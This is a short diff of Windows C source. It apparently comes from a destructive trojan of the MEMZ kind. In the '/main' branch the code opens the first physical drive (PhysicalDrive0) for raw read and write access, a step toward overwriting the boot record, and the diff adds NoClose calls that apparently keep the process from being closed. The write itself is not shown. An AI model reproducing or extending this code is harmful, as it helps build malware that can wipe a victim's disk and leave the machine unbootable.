@@ -32,7 +32,8 @@ void start() {
 				TranslateMessage(&msg);
 				DispatchMessage(&msg);
 			}
-		} else if(!lstrcmpW(argv[1], L"/main")) {	
+		} else if(!lstrcmpW(argv[1], L"/main")) {
+			NoClose(0);	
 			HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
 		
 			if (drive == INVALID_HANDLE_VALUE)
@@ -72,6 +73,7 @@ void start() {
 			for (;;) {
 				Sleep(10000);
 			}
+			NoClose(1);
 		}
 	} else {
 		// Another very ugly formatting
